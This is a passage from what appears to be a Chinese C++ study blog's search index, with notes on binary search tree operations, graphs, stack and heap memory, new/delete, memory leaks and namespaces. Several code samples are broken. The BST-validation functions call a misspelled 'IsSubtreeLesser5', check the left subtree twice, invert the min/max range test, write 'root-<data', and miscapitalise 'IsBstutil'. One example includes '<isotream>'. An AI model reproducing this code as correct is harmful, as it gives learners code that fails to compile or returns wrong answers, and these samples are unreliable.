class="built_in">Insert</span>(root,<span class="string">&#x27;Z&#x27;</span>); </span><br><span class="line">	root = <span class="built_in">Insert</span>(root,<span class="string">&#x27;A&#x27;</span>); root = <span class="built_in">Insert</span>(root,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">	<span class="comment">//Print Nodes in Preorder. </span></span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;Preorder: &quot;</span>;</span><br><span class="line">	<span class="built_in">Preorder</span>(root);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	<span class="comment">//Print Nodes in Inorder</span></span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;Inorder: &quot;</span>;</span><br><span class="line">	<span class="built_in">Inorder</span>(root);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	<span class="comment">//Print Nodes in Postorder</span></span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;Postorder: &quot;</span>;</span><br><span class="line">	<span class="built_in">Postorder</span>(root);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="判断是否为二叉搜索树"><a href="#判断是否为二叉搜索树" class="headerlink" title="判断是否为二叉搜索树"></a>判断是否为二叉搜索树</h4><p>二叉搜索树定义是每个节点的左子树上的节点都比它小或等于，右子树都比它大</p>
<p>第一种通过遍历的方式判断，花费成本较高O(n^2)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    Node *left;</span><br><span class="line">    Node *right;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">IsSubtreeLesser</span><span class="params">(Node* root, <span class="type">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;data&lt;=value</span><br><span class="line">      &amp;&amp;<span class="built_in">IsSubtreeLesser</span>(root-&gt;left,value)</span><br><span class="line">      &amp;&amp;<span class="built_in">IsSubtreeLesser</span>(root-&gt;right,value))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">IsSubtreeGreater</span><span class="params">(Node* root, <span class="type">int</span> value)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;data&gt;value</span><br><span class="line">      &amp;&amp;<span class="built_in">IsSubtreeGreater</span>(root-&gt;left,value)</span><br><span class="line">      &amp;&amp;<span class="built_in">IsSubtreeGreater</span>(root-&gt;right,value))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">IsBinarySearchTree</span><span class="params">(Node* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">IsSubtreeLesser5</span>(root-&gt;left,root-&gt;data)</span><br><span class="line">       &amp;&amp; <span class="built_in">IsSubtreeGreater</span>((root-&gt;left,root-&gt;data)</span><br><span class="line">       &amp;&amp; <span class="built_in">IsBinarySearchTree</span>(root-&gt;left)</span><br><span class="line">       &amp;&amp; <span class="built_in">IsBinarySearchTree</span>(root-&gt;right))  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二种方法，不需要比较一个节点的数据和他子树的所有节点 O(n)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">IsBstUtil</span><span class="params">(Node* root,<span class="type">int</span> minValue,<span class="type">int</span> maxValue)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;data&lt;minValue&amp;&amp;root-&gt;data&gt;maxValue</span><br><span class="line">      &amp;&amp;<span class="built_in">IsBstUtil</span>(root-&gt;left,minValue,root-&gt;data)</span><br><span class="line">      &amp;&amp;<span class="built_in">IsBstUtil</span>(root-&gt;right,root-&lt;data,maxValue)))  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">IsBinarySearchTree</span><span class="params">(Node* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">IsBstutil</span>(root,INT_MIN,INT_MAX);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="二叉搜索树删除一个节点"><a href="#二叉搜索树删除一个节点" class="headerlink" title="二叉搜索树删除一个节点"></a>二叉搜索树删除一个节点</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Deleting a node from Binary search tree */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">Node</span> *left;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">Node</span> *right;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//Function to find minimum in a tree. </span></span><br><span class="line"><span class="function">Node* <span class="title">FindMin</span><span class="params">(Node* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(root-&gt;left != <span class="literal">NULL</span>) root = root-&gt;left;</span><br><span class="line">	<span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Function to search a delete a value from tree.</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>* <span class="built_in">Delete</span>(<span class="keyword">struct</span> Node *root, <span class="type">int</span> data) &#123;</span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span> root; </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(data &lt; root-&gt;data) root-&gt;left = <span class="built_in">Delete</span>(root-&gt;left,data);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (data &gt; root-&gt;data) root-&gt;right = <span class="built_in">Delete</span>(root-&gt;right,data);</span><br><span class="line">	<span class="comment">// Wohoo... I found you, Get ready to be deleted	</span></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Case 1:  No child</span></span><br><span class="line">		<span class="keyword">if</span>(root-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;right == <span class="literal">NULL</span>) &#123; </span><br><span class="line">			<span class="keyword">delete</span> root;</span><br><span class="line">			root = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//Case 2: One child </span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;left == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">struct</span> Node *temp = root;</span><br><span class="line">			root = root-&gt;right;</span><br><span class="line">			<span class="keyword">delete</span> temp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">struct</span> Node *temp = root;</span><br><span class="line">			root = root-&gt;left;</span><br><span class="line">			<span class="keyword">delete</span> temp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// case 3: 2 children</span></span><br><span class="line">		<span class="keyword">else</span> &#123; </span><br><span class="line">			<span class="keyword">struct</span> Node *temp = <span class="built_in">FindMin</span>(root-&gt;right);</span><br><span class="line">			root-&gt;data = temp-&gt;data;</span><br><span class="line">			root-&gt;right = <span class="built_in">Delete</span>(root-&gt;right,temp-&gt;data);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//Function to visit nodes in Inorder</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Inorder</span><span class="params">(Node *root)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">Inorder</span>(root-&gt;left);       <span class="comment">//Visit left subtree</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,root-&gt;data);  <span class="comment">//Print data</span></span><br><span class="line">	<span class="built_in">Inorder</span>(root-&gt;right);      <span class="comment">// Visit right subtree</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Function to Insert Node in a Binary Search Tree</span></span><br><span class="line"><span class="function">Node* <span class="title">Insert</span><span class="params">(Node *root,<span class="type">char</span> data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		root = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">		root-&gt;data = data;</span><br><span class="line">		root-&gt;left = root-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(data &lt;= root-&gt;data)</span><br><span class="line">		root-&gt;left = <span class="built_in">Insert</span>(root-&gt;left,data);</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		root-&gt;right = <span class="built_in">Insert</span>(root-&gt;right,data);</span><br><span class="line">	<span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">/*Code To Test the logic</span></span><br><span class="line"><span class="comment">	  Creating an example tree</span></span><br><span class="line"><span class="comment">	            5</span></span><br><span class="line"><span class="comment">			   / \</span></span><br><span class="line"><span class="comment">			  3   10</span></span><br><span class="line"><span class="comment">			 / \   \</span></span><br><span class="line"><span class="comment">			1   4   11</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	Node* root = <span class="literal">NULL</span>;</span><br><span class="line">	root = <span class="built_in">Insert</span>(root,<span class="number">5</span>); root = <span class="built_in">Insert</span>(root,<span class="number">10</span>);</span><br><span class="line">	root = <span class="built_in">Insert</span>(root,<span class="number">3</span>); root = <span class="built_in">Insert</span>(root,<span class="number">4</span>); </span><br><span class="line">	root = <span class="built_in">Insert</span>(root,<span class="number">1</span>); root = <span class="built_in">Insert</span>(root,<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Deleting node with value 5, change this value to test other cases</span></span><br><span class="line">	root = <span class="built_in">Delete</span>(root,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Print Nodes in Inorder</span></span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;Inorder: &quot;</span>;</span><br><span class="line">	<span class="built_in">Inorder</span>(root);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="二叉搜索树的中序后继节点"><a href="#二叉搜索树的中序后继节点" class="headerlink" title="二叉搜索树的中序后继节点"></a>二叉搜索树的中序后继节点</h4><p>给定一个二叉树的节点，找到在二叉搜索树的中序遍历中紧跟着这个给定节点的下一个节点</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* C++ program to find Inorder successor in a BST */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">Node</span> *left;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">Node</span> *right;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Function to find some data in the tree</span></span><br><span class="line"><span class="function">Node* <span class="title">Find</span><span class="params">(Node*root, <span class="type">int</span> data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;data == data) <span class="keyword">return</span> root;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;data &lt; data) <span class="keyword">return</span> <span class="built_in">Find</span>(root-&gt;right,data);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">Find</span>(root-&gt;left,data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Function to find Node with minimum value in a BST</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>* <span class="built_in">FindMin</span>(<span class="keyword">struct</span> Node* root) &#123;</span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">while</span>(root-&gt;left != <span class="literal">NULL</span>)</span><br><span class="line">		root = root-&gt;left;</span><br><span class="line">	<span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Function to find Inorder Successor in a BST</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>* <span class="built_in">Getsuccessor</span>(<span class="keyword">struct</span> Node* root,<span class="type">int</span> data) &#123;</span><br><span class="line">	<span class="comment">// Search the Node - O(h)</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">Node</span>* current = <span class="built_in">Find</span>(root,data);</span><br><span class="line">	<span class="keyword">if</span>(current == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span>(current-&gt;right != <span class="literal">NULL</span>) &#123;  <span class="comment">//Case 1: Node has right subtree</span></span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">FindMin</span>(current-&gt;right); <span class="comment">// O(h)</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;   <span class="comment">//Case 2: No right subtree  - O(h)</span></span><br><span class="line">		<span class="keyword">struct</span> Node* successor = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">Node</span>* ancestor = root;</span><br><span class="line">		<span class="keyword">while</span>(ancestor != current) &#123;</span><br><span class="line">			<span class="keyword">if</span>(current-&gt;data &lt; ancestor-&gt;data) &#123;</span><br><span class="line">				successor = ancestor; <span class="comment">// so far this is the deepest node for which current node is in left</span></span><br><span class="line">				ancestor = ancestor-&gt;left;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				ancestor = ancestor-&gt;right;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> successor;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//Function to visit nodes in Inorder</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Inorder</span><span class="params">(Node *root)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">Inorder</span>(root-&gt;left);       <span class="comment">//Visit left subtree</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,root-&gt;data);  <span class="comment">//Print data</span></span><br><span class="line">	<span class="built_in">Inorder</span>(root-&gt;right);      <span class="comment">// Visit right subtree</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Function to Insert Node in a Binary Search Tree</span></span><br><span class="line"><span class="function">Node* <span class="title">Insert</span><span class="params">(Node *root,<span class="type">char</span> data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		root = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">		root-&gt;data = data;</span><br><span class="line">		root-&gt;left = root-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(data &lt;= root-&gt;data)</span><br><span class="line">		root-&gt;left = <span class="built_in">Insert</span>(root-&gt;left,data);</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		root-&gt;right = <span class="built_in">Insert</span>(root-&gt;right,data);</span><br><span class="line">	<span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">/*Code To Test the logic</span></span><br><span class="line"><span class="comment">	  Creating an example tree</span></span><br><span class="line"><span class="comment">	            5</span></span><br><span class="line"><span class="comment">			   / \</span></span><br><span class="line"><span class="comment">			  3   10</span></span><br><span class="line"><span class="comment">			 / \   \</span></span><br><span class="line"><span class="comment">			1   4   11</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	Node* root = <span class="literal">NULL</span>;</span><br><span class="line">	root = <span class="built_in">Insert</span>(root,<span class="number">5</span>); root = <span class="built_in">Insert</span>(root,<span class="number">10</span>);</span><br><span class="line">	root = <span class="built_in">Insert</span>(root,<span class="number">3</span>); root = <span class="built_in">Insert</span>(root,<span class="number">4</span>); </span><br><span class="line">	root = <span class="built_in">Insert</span>(root,<span class="number">1</span>); root = <span class="built_in">Insert</span>(root,<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Print Nodes in Inorder</span></span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;Inorder Traversal: &quot;</span>;</span><br><span class="line">	<span class="built_in">Inorder</span>(root);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Find Inorder successor of some node. </span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">Node</span>* successor = <span class="built_in">Getsuccessor</span>(root,<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span>(successor == <span class="literal">NULL</span>) cout&lt;&lt;<span class="string">&quot;No successor Found\n&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Successor is &quot;</span>&lt;&lt;successor-&gt;data&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="图-graphs"><a href="#图-graphs" class="headerlink" title="图(graphs)"></a>图(graphs)</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><strong>概念：</strong></p>
<p>没有节点之间链接的功能</p>
<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-07-15 084218.png)</p>
<p>图是一个有序对，有顶集与边集组成，G&#x3D;(V,E)是我们用来定义图的一个正确数学符号。</p>
<p>如上图，一共有8的节点和10条边。我们先要给这些节点起名字，将他们分位{v1,v2,,,,,v8}一共8个元素，这就是这个图的顶点集，而如何定义这个图的边集呢？</p>
<p>首先我们确定一条边是由两个端点连接而成，边集可以是有向（()）和无向的（{}），这里我们将其定义为无向的，E</p>
]]></content>
      <categories>
        <category>c/c++学习笔记</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>现代C++学习笔记</title>
    <url>/2023/03/05/%E7%8E%B0%E4%BB%A3C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="C-的基本特性"><a href="#C-的基本特性" class="headerlink" title="C++的基本特性"></a>C++的基本特性</h1><h2 id="程序的执行过程"><a href="#程序的执行过程" class="headerlink" title="程序的执行过程"></a>程序的执行过程</h2><p>程序被执行后就被称为一个进程，一个进程可以被划分为很多区域。</p>
<p>其中比较重要的是以下四个区域。</p>
<p><strong>1代码区与常量区：</strong>进程按照代码区的代码执行，真正的常量也存储在这里，比如“abc”字符串，“1”，“88”等数字。这些是真正的常量。再看一下const关键字。const只不过是让编译器将变量视为常量罢了，和真正的常量有本质上的区别</p>
<p><strong>2栈区：</strong>函数的执行所需的空间，注意，当函数执行完毕，函数对应的栈内存全部销毁。</p>
<p><strong>3堆区：</strong>进程用来分配内存的地方，只有手动释放才能销毁内存。</p>
<p><strong>4静态变量区：</strong></p>
<p>(1)静态变量：常常遇到的一些局部作用范围，生命周期却很长的变量。</p>
<p>(2)全局变量：在c++中不建议使用，会破坏封装性。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jangfan/picb@main/image-20230306163148843-1678164508218-1.png"></p>
<hr>
<p><strong>堆和栈的关系</strong></p>
<p>堆区有灵活的生命周期。如果需要创建的对象有几十M，每次调用函数都需要创建一个这么大的对象，再复制到对应的容器中，那就太过耗费内存了。而且栈内存非常的小，通常不超过8M。而使用堆内存，每调用一次函数就可以在堆内存中创建一个对象，容器中只要存储指针就可以了，极大的提高了程序效率。栈区是函数执行的区域，堆区是函数内灵活分配内存的地方，二者缺一不可。堆的唯一寻址方式就是指针，如果没有栈，根本无法使用堆。</p>
<h2 id="new-关键字及内存泄漏"><a href="#new-关键字及内存泄漏" class="headerlink" title="(*) new 关键字及内存泄漏"></a>(*) new 关键字及内存泄漏</h2><p><strong>1.new关键字是c++用来动态分配内存的主要方式</strong>.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;isotream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>* pi = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">100</span>);</span><br><span class="line">	std::cout &lt;&lt; *pi &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">delete</span> pi;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>new可以直接分配单个变量的内存，也可以分配数组。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	<span class="type">int</span>* pi = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">100</span>]();<span class="comment">//小括号初始化为零，没有小括号分配未定义的内存，而且不可以赋初值</span></span><br><span class="line">	std::cout &lt;&lt; pi[<span class="number">20</span>] &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">delete</span>[] pi;<span class="comment">//不加中括号会导致动态内存泄露</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>在分配单个对象的内存时，</strong></p>
<p>当对象是普通变量时，可以分配对应的内存</p>
<p>当对象是类对象时，会调用构造函数，如果没有对应的构造函数，就会报错。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::string* pString = <span class="keyword">new</span> std::<span class="built_in">string</span>(<span class="string">&quot;hello world&quot;</span>);<span class="comment">//如果是字符串数组的话不能赋初值</span></span><br><span class="line">	std::cout &lt;&lt; *pString &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">delete</span> pString;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在分配数组对象内存时：</p>
<p>对于普通变量：可以使用“（）”将所有对象全部初始化为0。</p>
<p>对于类对象，有没有“（）”都一样，均使用默认构造函数，如果没有默认构造函数就会报错。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test</span>(<span class="type">int</span> i_) :<span class="built_in">i</span>(i_)&#123;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	Test* pTest = <span class="keyword">new</span> Test[<span class="number">100</span>];<span class="comment">//这是错误的,类Test不存在默认构造函数</span></span><br><span class="line">	<span class="keyword">delete</span>[] pTest;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2内存泄漏</strong></p>
<p>​	内存泄露会导致堆内存的逐渐被占用，最终内存用完程序崩溃。常见的情况就是项目测试没问题，上线几天就炸了。然后就会非常麻烦，排查困难，损失很大。</p>
<p><strong>内存泄露是最严重的错误之一，程序不怕报错，就怕一开始运行的好好的，突然就出现了莫名其妙的错误。</strong></p>
<p>这句话也引出了后面的两个部分。（期待学习hhh）</p>
<p><strong>Part4的智能指针</strong>可以非常好的避免内存泄露的问题。</p>
<p><strong>Part9的异常处理</strong>部分可以恰当的处理程序出现的异常，让程序有错误就立马处理，或直接终止进程，或忽略，不要让异常莫名其妙。这是程序设计的重要理念。</p>
<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>C++经常需要多个团队合作来完成大型项目。多个团队就常常出现起名重复的问题，C++就提供了命名空间来解决这个问题。</p>
<p><strong>例子</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ATest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">BTest.h</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">BTest.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;B::()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">ATest.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;A::()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">main.cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;ATest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;BTest.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>();<span 